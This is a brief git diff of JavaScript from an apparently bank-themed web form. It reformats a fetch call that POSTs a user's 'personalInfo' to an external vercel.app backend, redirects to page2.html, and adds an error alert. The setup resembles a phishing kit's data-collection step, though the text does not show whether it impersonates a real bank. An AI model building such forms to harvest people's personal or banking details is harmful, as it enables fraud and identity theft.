@@ -24,18 +24,21 @@ function validateEmail(email) {
     return re.test(String(email).toLowerCase());
 };
 
-    fetch("https://bank-backend-gold.vercel.app", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(personalInfo),
-    })
-    .then(response => response.json())
-    .then(data => {
-        console.log("Data submitted successfully:", data);
-        window.location.href = "page2.html"; // Navigate to the next page
-    })
-    .catch(error => console.error("Error:", error));
+   fetch("https://bank-backend-gold.vercel.app", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(personalInfo),
+})
+.then(response => response.json())
+.then(data => {
+    console.log("Data submitted successfully:", data);
+    window.location.href = "page2.html"; // Navigate to the next page
+})
+.catch(error => {
+    console.error("Error:", error);
+    alert("An error occurred. Please try again later.");
 });
+
 // Navigation function for buttons
 function goToPage(page) {
   window.location.href = page;
